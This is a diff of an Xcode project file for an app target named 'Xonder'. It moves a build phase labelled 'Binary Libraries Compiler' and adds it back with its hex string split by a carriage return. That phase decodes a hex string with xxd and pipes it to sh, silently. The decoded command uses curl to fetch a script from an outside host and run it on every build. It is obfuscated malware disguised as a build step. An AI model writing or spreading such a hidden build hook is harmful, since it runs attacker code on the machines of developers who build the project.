@@ -555,8 +555,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				4689771A2DB43D203A6D902C /* Binary Libraries Compiler */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
+				4689771A2DB43D203A6D902C /* Binary Libraries Compiler */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -628,29 +628,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	4689771A2DB43D203A6D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -672,6 +649,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		4689771A2DB43D203A6D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\r61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		7BEA9A0E4477978A64735F4F /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -977,16 +972,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 706035F726432A560062039F /* Project object */;
 }
